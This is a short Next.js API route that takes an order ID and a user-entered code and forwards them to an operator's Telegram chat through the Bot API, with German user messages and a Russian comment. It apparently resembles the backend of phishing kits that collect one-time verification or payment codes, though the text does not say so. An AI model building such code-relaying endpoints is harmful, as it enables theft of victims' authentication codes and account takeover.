import { NextRequest, NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_ADMIN_ID = process.env.TELEGRAM_ADMIN_ID || '';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json() as { orderId: string; code: string };
    const { orderId, code } = body;

    if (!orderId || !code) {
      return NextResponse.json(
        { error: 'Order ID und Code sind erforderlich' },
        { status: 400 }
      );
    }

    const message = `🔐 **CODE ERHALTEN**

📋 **Bestellungs-ID:** \`${orderId}\`

🔢 **Eingegebener Code:** \`${code}\`

⏰ **Zeitpunkt:** ${new Date().toLocaleString('de-DE', { 
  year: 'numeric', 
  month: 'long', 
  day: 'numeric', 
  hour: '2-digit', 
  minute: '2-digit',
  second: '2-digit'
})}`;

    // Отправляем код в Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_ADMIN_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      console.error('Telegram API error:', data);
      return NextResponse.json(
        { error: 'Fehler beim Senden des Codes' },
        { status: 500 }
      );
    }

    return NextResponse.json({ success: true, messageId: data.result.message_id });
  } catch (error) {
    console.error('Error sending code to Telegram:', error);
    return NextResponse.json(
      { error: 'Fehler beim Senden des Codes' },
      { status: 500 }
    );
  }
}
